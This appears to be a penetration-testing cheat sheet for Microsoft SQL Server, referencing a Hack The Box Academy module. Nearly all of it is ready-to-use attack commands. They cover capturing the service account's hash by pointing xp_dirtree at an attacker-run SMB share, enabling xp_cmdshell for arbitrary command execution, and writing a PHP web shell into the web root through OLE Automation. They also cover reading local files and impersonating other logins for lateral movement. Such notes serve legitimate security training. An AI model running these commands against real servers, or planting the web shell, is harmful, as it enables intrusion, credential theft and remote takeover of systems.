Usual Port: 1433

Common Action:

-Connecting to MSSQL using impacket-mssqlclient
```
impacket-mssqlclient <username>@<ip> -windows-auth
#or
python3 mssqlclient.py <username>@<ip> -windows-auth
```
Alternative - Use sqsh:
```
sqsh -S <ip> -U <username> -P '<password>' -h
```
Automated Tools:

-Using nmap for script scan:
```
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=<port>,mssql.username=<username>,mssql.password=<password/blank>,mssql.instance-name=<instancename> -sV -p <port> <ip>
```

-Using Metasploit for recon:
```
#in msfconsole
use scanner/mssql/mssql_ping
set rhosts <ip>
exploit
```

-Capturing MSSQL Service Hash:

We can first use responder to create a fake SMB server, then have mssql verify its identity against our server with its hash:
```
sudo responder -I <interface>
EXEC master..xp_dirtree '\\<ip>\<sharename>\'
Example: EXEC master..xp_dirtree '\\10.10.16.112\share'
GO
#Alternative
EXEC master..xp_subdirs '\\<ip>\<sharename>\'
Example: EXEC master..xp_subdirs '\\10.10.16.112\share'
```


Post Entry:

We can use xp_cmdshell to execute arbitrary command:
```
xp_cmdshell '<command>'
#Example
xp_cmdshell 'whoami'
```

If it is not enabled, we can also enable it:
```
#In msssqlclient:
enable xp_cmdshell
#Native:
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure'xp_cmdshell', 1
RECONFIGURE
```

We can enable OLE Automation Procedures to allow file creation:
```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
After that, we can create file with MSSQL:
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<path_to_file>', 8, 1
4Example> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<stringtofile>'
5Example> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
With Permission, we can read local files with MSSQL:
```
1> SELECT * FROM OPENROWSET(BULK N'<fileabspath>', SINGLE_CLOB) AS Contents
2> GO
```

If we have access to sysadm account or privileged account, we can impersonate other users to do lateral / horizontal movement:

Confirming our Current User and Role:
```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

Identify users we can impersonate:
```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO #Output will be a list of user we can impersonate
```

Impersonating as other user:
```
1> EXECUTE AS LOGIN = '<username>'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin') #Confirm sysadmin member status
4> GO
#If user we are impersonating don't have access to current DB we are in, error will be presented, in such case we can move to master db first by typing USE master
```






Ref: https://academy.hackthebox.com/app/module/112/section/1246